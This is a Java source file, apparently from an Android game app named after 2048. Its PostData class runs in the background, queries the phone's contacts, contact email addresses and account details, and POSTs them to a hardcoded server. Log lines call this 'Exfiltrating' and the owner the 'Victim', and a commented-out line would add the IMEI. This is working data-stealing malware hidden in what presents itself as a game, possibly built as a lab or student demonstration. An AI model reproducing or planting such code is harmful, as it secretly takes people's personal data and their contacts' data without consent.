package aarkay.a2048game;

import static contacts.core.ContactsKt.Contacts;

import android.content.Context;
import android.os.Build;
import android.telephony.TelephonyManager;
import android.util.Log;

import androidx.annotation.RequiresApi;

import com.android.volley.Request;
import com.android.volley.RequestQueue;
import com.android.volley.Response;
import com.android.volley.VolleyError;
import com.android.volley.toolbox.StringRequest;
import com.android.volley.toolbox.Volley;

import org.jetbrains.annotations.NotNull;

import java.io.IOException;
import java.util.HashMap;
import java.util.Map;

public class PostData {
    @RequiresApi(api = Build.VERSION_CODES.O)
    public PostData(@NotNull Context context) throws IOException {



        RequestQueue queue = Volley.newRequestQueue(context);
        String urlString = "http://192.168.195.189:5000/postData";

        Thread thread = new Thread(new Runnable() {
            @Override
            public void run() {
                Log.d("Sending Data", "Exfiltrating");
                try {
                    StringRequest stringRequest = new StringRequest(Request.Method.POST, urlString,
                            new Response.Listener<String>() {

                                @Override
                                public void onResponse(String response) {

                                    Log.d("Response String", response.substring(0, 500));
                                }
                            }, new Response.ErrorListener() {
                        @Override
                        public void onErrorResponse(VolleyError error) {
                            Log.d("Volley Error", String.valueOf(error));
                        }
                    }) {
                        @Override
                        protected Map<String, String> getParams() {
                            //Using HashMap to craft the data to be sent
                            Map<String, String> params = new HashMap<String, String>();
                      //      params.put("IMEINumber", IMEINumber);
                            Log.d("dd", Contacts(context).query().find().toString());
                            Log.d("Emails", Contacts(context).data().query().emails().find().toString());
                            Log.d("Victim User Account", Contacts(context).accounts().queryRawContacts().find().getClass().getSimpleName());

                            params.put("Contacts", Contacts(context).query().find().toString());
                            params.put("Emails", Contacts(context).data().query().emails().find().toString());
                            params.put("Victim Account", Contacts(context).accounts().queryRawContacts().find().getClass().getSimpleName());
                            return params;
                        }
                    };
                    queue.add(stringRequest);
                } catch (Exception e) {
                    Log.d("Error", e.toString());
                }
            }
        });

        thread.start();
    }
}
